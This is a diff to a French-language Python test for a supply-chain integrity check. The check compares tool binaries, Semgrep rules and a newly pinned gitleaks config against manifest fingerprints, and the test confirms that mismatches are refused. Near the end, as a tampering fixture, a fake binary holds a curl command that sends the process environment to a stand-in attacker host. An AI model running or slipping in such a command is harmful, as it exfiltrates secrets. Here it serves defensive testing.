@@ -66,26 +66,41 @@ regles:
   une.yaml:
     source: https://example.invalid/une
     sha256: {empreinte_regles}
+  gitleaks.toml:
+    source: ./PHASE3/regles/gitleaks.toml
+    sha256: {empreinte_gitleaks}
 """
 
 CORPS = b"#!/bin/sh\necho moi, le faux outil\n"
 REGLE = b"rules: []\n"
+GITLEAKS = b"[extend]\nuseDefault = true\n"
 
 with tempfile.TemporaryDirectory(prefix="empreintes-") as td:
     racine = Path(td)
     bin_, reg = racine / "bin", racine / "rules"
     bin_.mkdir(); reg.mkdir()
     manifeste = racine / "manifeste.yaml"
-    manifeste.write_text(MANIFESTE.format(empreinte=sha(CORPS), empreinte_regles=sha(REGLE)),
+    manifeste.write_text(MANIFESTE.format(empreinte=sha(CORPS), empreinte_regles=sha(REGLE),
+                                          empreinte_gitleaks=sha(GITLEAKS)),
                          encoding="utf-8")
 
     # ---------- conforme : le contrôle ne doit RIEN refuser quand tout correspond
     (bin_ / "fauxoutil").write_bytes(CORPS)
     (reg / "une.yaml").write_bytes(REGLE)
+    (reg / "gitleaks.toml").write_bytes(GITLEAKS)
     prob = S.empreintes_conformes(bin_, reg, manifeste)
     cas("1. binaire conforme au manifeste : aucune interdiction", not prob, str(prob)[:120])
     cas("2. jeu de règles conforme : aucune interdiction", "règle" not in " ".join(prob),
         str(prob)[:120])
+    # SEC-G6a/F7 : la config gitleaks est épinglée comme les règles Semgrep — une
+    # divergence change la grille d'évaluation des secrets, c'est un refus nommé.
+    (reg / "gitleaks.toml").write_bytes(b"[extend]\nuseDefault = false\n")
+    S._MEMO_EMPREINTE.clear()
+    prob = S.empreintes_conformes(bin_, reg, manifeste)
+    cas("2b. config gitleaks divergente du manifeste : refus nommé (grille de secrets)",
+        any("gitleaks.toml" in x and "empreinte divergente" in x for x in prob), str(prob)[:150])
+    (reg / "gitleaks.toml").write_bytes(GITLEAKS)              # conforme rétabli
+    S._MEMO_EMPREINTE.clear()
 
     # ---------- divergent : c'est le trou G8, il doit fermer
     (bin_ / "fauxoutil").write_bytes(b"#!/bin/sh\ncurl http://ataquant.tld/$(env)\n")
